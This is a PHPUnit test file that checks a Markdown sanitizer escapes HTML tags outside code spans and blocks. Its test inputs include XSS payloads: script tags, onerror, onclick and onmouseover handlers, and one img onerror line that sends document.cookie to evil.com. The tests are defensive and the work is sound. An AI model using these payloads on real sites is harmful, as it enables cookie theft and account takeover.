<?php

declare(strict_types=1);

namespace App\Tests\Unit\Utils;

use App\Utils\MarkdownSanitizer;
use PHPUnit\Framework\TestCase;

class MarkdownSanitizerTest extends TestCase
{
    public function testPlainTextIsUnchanged(): void
    {
        self::assertSame('Hello world', MarkdownSanitizer::sanitize('Hello world'));
    }

    public function testMarkdownSyntaxIsPreserved(): void
    {
        $md = "# Heading\n\n**bold** _italic_ ~~strike~~\n\n> blockquote\n\n- item";
        self::assertSame($md, MarkdownSanitizer::sanitize($md));
    }

    public function testScriptTagIsEscaped(): void
    {
        $input = 'Hello <script>alert("xss")</script> world';
        $expected = 'Hello &lt;script&gt;alert("xss")&lt;/script&gt; world';
        self::assertSame($expected, MarkdownSanitizer::sanitize($input));
    }

    public function testHtmlTagsAreEscaped(): void
    {
        $input = 'click <a href="evil.com" onclick="steal()">here</a>';
        $expected = 'click &lt;a href="evil.com" onclick="steal()"&gt;here&lt;/a&gt;';
        self::assertSame($expected, MarkdownSanitizer::sanitize($input));
        // Quotes inside the tag are preserved as-is (only angle brackets are escaped)
    }

    public function testInlineCodeSpanIsPreserved(): void
    {
        $input = 'Use `<div>` for layout';
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testFencedCodeBlockIsPreserved(): void
    {
        $input = "```html\n<script>alert('xss')</script>\n```";
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testTildeCodeBlockIsPreserved(): void
    {
        $input = "~~~\n<img onerror='evil()'>\n~~~";
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testHtmlOutsideCodeBlockIsEscapedButInsideIsPreserved(): void
    {
        $input = "<b>bold</b> and ```\n<script>bad</script>\n``` end";
        $expected = "&lt;b&gt;bold&lt;/b&gt; and ```\n<script>bad</script>\n``` end";
        self::assertSame($expected, MarkdownSanitizer::sanitize($input));
    }

    public function testMarkdownAutolinkIsPreserved(): void
    {
        $input = 'Visit <https://example.com> for info';
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testImgTagWithOnerrorIsEscaped(): void
    {
        $input = '<img src="x" onerror="alert(1)">';
        $expected = '&lt;img src="x" onerror="alert(1)"&gt;';
        self::assertSame($expected, MarkdownSanitizer::sanitize($input));
    }

    public function testMultipleCodeSpansWithHtmlOutside(): void
    {
        $input = '<b>hi</b> `<code>` <i>yo</i> `<em>`';
        $expected = '&lt;b&gt;hi&lt;/b&gt; `<code>` &lt;i&gt;yo&lt;/i&gt; `<em>`';
        self::assertSame($expected, MarkdownSanitizer::sanitize($input));
    }

    public function testEmptyStringIsUnchanged(): void
    {
        self::assertSame('', MarkdownSanitizer::sanitize(''));
    }

    public function testSpanTagIsEscaped(): void
    {
        $input = '<span class="evil" onmouseover="steal()">text</span>';
        $expected = '&lt;span class="evil" onmouseover="steal()"&gt;text&lt;/span&gt;';
        self::assertSame($expected, MarkdownSanitizer::sanitize($input));
    }

    public function testMarkdownMentionLinkIsPreserved(): void
    {
        // Mentions stored as Markdown links — no HTML involved, nothing to escape.
        $input = 'Hello [@Alice](user:42) and [#general](channel:general)!';
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testTagContainingUrlInAttributeIsEscaped(): void
    {
        // A URL inside an attribute value must NOT bypass sanitization.
        $input = '<img src=x onerror=fetch("https://evil.com/"+document.cookie)>';
        $result = MarkdownSanitizer::sanitize($input);
        self::assertStringNotContainsString('<img', $result);
        self::assertStringStartsWith('&lt;', $result);
    }

    public function testNullByteWithScriptTagIsEscaped(): void
    {
        $input = "hello\x00<script>xss</script>";
        $result = MarkdownSanitizer::sanitize($input);
        self::assertStringNotContainsString('<script>', $result);
        self::assertStringContainsString('&lt;script&gt;', $result);
    }

    public function testAlreadyHtmlEncodedEntitiesAreNotDoubleEncoded(): void
    {
        // Input already has encoded entities — must not be double-encoded.
        $input = '&lt;script&gt;alert(1)&lt;/script&gt;';
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testVeryLongTagAttributeIsEscaped(): void
    {
        $input = '<img '.str_repeat('x', 5000).'>';
        $result = MarkdownSanitizer::sanitize($input);
        self::assertStringStartsWith('&lt;', $result);
        self::assertStringEndsWith('&gt;', $result);
    }

    public function testUnclosedFenceDoesNotLeakHtml(): void
    {
        // No closing ```, so the "code block" never closes — the script must be escaped.
        $input = "```\n<script>bad()</script>";
        $result = MarkdownSanitizer::sanitize($input);
        self::assertStringNotContainsString('<script>', $result);
    }

    public function testDoubleBacktickCodeSpanIsPreserved(): void
    {
        $input = 'Use `` <div class="x"> `` here';
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }

    public function testUnicodeLookalikeAnglesAreNotEscaped(): void
    {
        // Fullwidth angle brackets (U+FF1C, U+FF1E) are not HTML delimiters.
        $input = '＜script＞alert(1)＜/script＞';
        self::assertSame($input, MarkdownSanitizer::sanitize($input));
    }
}
